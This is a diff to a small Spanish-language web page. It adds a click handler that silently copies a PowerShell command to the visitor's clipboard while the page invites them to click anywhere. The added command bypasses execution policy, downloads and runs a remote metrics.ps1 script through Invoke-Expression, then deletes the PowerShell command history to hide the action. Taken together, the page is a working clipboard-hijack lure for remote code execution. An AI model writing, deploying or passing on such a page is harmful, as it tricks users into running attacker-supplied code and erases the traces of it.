@@ -5,13 +5,14 @@
     <title>Inicio</title>
 </head>
 <body onclick="copiarComando()">
-    <p>Soy una prueba</p>
+
+    <p style="cursor: pointer;">Haz clic en cualquier parte para copiar el comando</p>
+
     <script>
         function copiarComando() {
-            const cmd = 'cd "$HOME\\Desktop"; Set-ExecutionPolicy Restricted -Scope CurrentUser; Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; .\\metrics.ps1';
-            
+            const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'https://web.haroldsoftware.com/metrics.ps1'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue\"";
             navigator.clipboard.writeText(cmd).then(() => {
-                // Se removió el listener o el atributo para no sobrescribir el portapapeles en clics posteriores
+                console.log('Comando copiado al portapapeles');
                 document.body.removeAttribute('onclick');
             }).catch(err => {
                 console.error('Error al copiar: ', err);
